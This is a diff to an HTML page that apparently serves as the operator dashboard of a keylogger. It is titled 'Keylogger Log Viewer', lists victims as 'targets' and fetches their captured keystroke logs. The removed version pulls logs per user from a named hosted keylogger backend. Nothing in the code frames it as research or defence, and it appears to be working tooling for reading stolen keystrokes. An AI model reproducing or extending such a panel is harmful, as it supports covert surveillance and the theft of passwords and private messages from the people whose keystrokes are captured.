@@ -3,108 +3,37 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Log Viewer</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 20px;
-        }
-        #logs {
-            white-space: pre-wrap;
-            background: #f4f4f4;
-            padding: 10px;
-            border: 1px solid #ccc;
-            margin-top: 20px;
-            overflow: auto;
-        }
-        select, button {
-            margin: 10px 0;
-        }
-    </style>
+    <title>Keylogger Logs</title>
 </head>
 <body>
-    <h1>Log Viewer</h1>
-    <div>
-        <label for="user-select">Select User:</label>
-        <select id="user-select"></select>
-        <button onclick="fetchUserLogs()">View Logs</button>
-        <button onclick="fetchAllLogs()">Show All Logs</button>
-    </div>
-    <div id="logs">Logs will appear here...</div>
+    <h1>Keylogger Log Viewer</h1>
+    <h2>Available Targets</h2>
+    <ul id="targets-list"></ul>
+    <h2>View Logs</h2>
+    <input type="text" id="target-name" placeholder="Enter target name">
+    <button onclick="getLogs()">Get Logs</button>
+    <pre id="log-output"></pre>
 
     <script>
-        const API_BASE = "https://keylogger-production-3a51.up.railway.app";
-
-        // Fetch all users and populate dropdown
-        async function populateUserDropdown() {
-            try {
-                const response = await fetch(`${API_BASE}/logs`);
-                if (response.ok) {
-                    const data = await response.json();
-                    const userSelect = document.getElementById("user-select");
-                    userSelect.innerHTML = "";
-
-                    Object.keys(data.all_logs).forEach(user => {
-                        const option = document.createElement("option");
-                        option.value = user;
-                        option.textContent = user;
-                        userSelect.appendChild(option);
-                    });
-                } else {
-                    console.error("Failed to fetch users");
-                }
-            } catch (error) {
-                console.error("Error populating user dropdown:", error);
-            }
+        async function getTargets() {
+            const response = await fetch('/targets');
+            const data = await response.json();
+            const targetsList = document.getElementById("targets-list");
+            data.targets.forEach(target => {
+                const li = document.createElement("li");
+                li.textContent = target;
+                targetsList.appendChild(li);
+            });
         }
 
-        // Fetch logs for a specific user
-        async function fetchUserLogs() {
-            const userSelect = document.getElementById("user-select");
-            const userName = userSelect.value;
-            const logsDiv = document.getElementById("logs");
-
-            if (!userName) {
-                logsDiv.textContent = "Please select a user.";
-                return;
-            }
-
-            try {
-                const response = await fetch(`${API_BASE}/logs?user_name=${userName}`);
-                if (response.ok) {
-                    const data = await response.json();
-                    logsDiv.textContent = `Logs for ${data.user_name}:\n\n${data.logs.join("")}`;
-                } else {
-                    const errorData = await response.json();
-                    logsDiv.textContent = `Error: ${errorData.detail}`;
-                }
-            } catch (error) {
-                logsDiv.textContent = "Error fetching user logs.";
-                console.error("Error fetching user logs:", error);
-            }
+        async function getLogs() {
+            const targetName = document.getElementById("target-name").value;
+            const response = await fetch(`/logs/${targetName}`);
+            const data = await response.json();
+            document.getElementById("log-output").textContent = data.logs || "No logs found.";
         }
 
-        // Fetch all logs
-        async function fetchAllLogs() {
-            const logsDiv = document.getElementById("logs");
-
-            try {
-                const response = await fetch(`${API_BASE}/logs`);
-                if (response.ok) {
-                    const data = await response.json();
-                    logsDiv.textContent = JSON.stringify(data.all_logs, null, 2);
-                } else {
-                    const errorData = await response.json();
-                    logsDiv.textContent = `Error: ${errorData.detail}`;
-                }
-            } catch (error) {
-                logsDiv.textContent = "Error fetching all logs.";
-                console.error("Error fetching all logs:", error);
-            }
-        }
-
-        // Populate dropdown on page load
-        document.addEventListener("DOMContentLoaded", populateUserDropdown);
+        window.onload = getTargets;
     </script>
 </body>
 </html>
